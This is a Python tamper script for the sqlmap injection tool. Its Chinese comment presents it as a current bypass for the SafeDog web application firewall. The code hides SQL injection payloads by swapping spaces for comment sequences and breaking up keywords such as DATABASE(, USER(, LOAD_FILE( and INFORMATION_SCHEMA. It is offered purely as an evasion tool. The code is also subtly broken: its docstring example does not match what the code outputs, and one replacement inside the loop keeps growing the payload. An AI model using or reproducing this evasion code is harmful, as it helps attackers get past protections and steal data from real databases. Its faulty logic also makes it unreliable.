#!/usr/bin/env python
# 最新过安全狗sqlmap tamper脚本
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with custom annotator ('/*//--*/')

    Notes:
        * This tamper script works against safedog-waf.

    >>> tamper('SELECT id FROM users')
    'SELECT/*//--*/id/*//--*/FROM/*//--*/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/*//--//*/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/*//--//*/"
                continue

            retVal += payload[i]

            retVal=retVal.replace('DATABASE(','DATABASE/*//--//*/(')
            retVal=retVal.replace('VERSION(','VERSION/*//--//*/(')
            retVal=retVal.replace('CURRENT_USER(','CURRENT_USER/*//--//*/(')
            retVal=retVal.replace('SYSTEM_USER(','SYSTEM_USER/*//--//*/(')
            retVal=retVal.replace('SESSION_USER(','SESSION_USER/*//--//*/(')
            retVal=retVal.replace('USER(','USER/*//--//*/(')
            retVal=retVal.replace('LOAD_FILE(','LOAD_FILE/*//--//*/(')
            retVal=retVal.replace('/AS','/--+/*%0aAS--+*/%0a')
            retVal=retVal.replace('INFORMATION_SCHEMA','--+/*%0aINFORMATION_SCHEMA--+*/%0a')

    return retVal
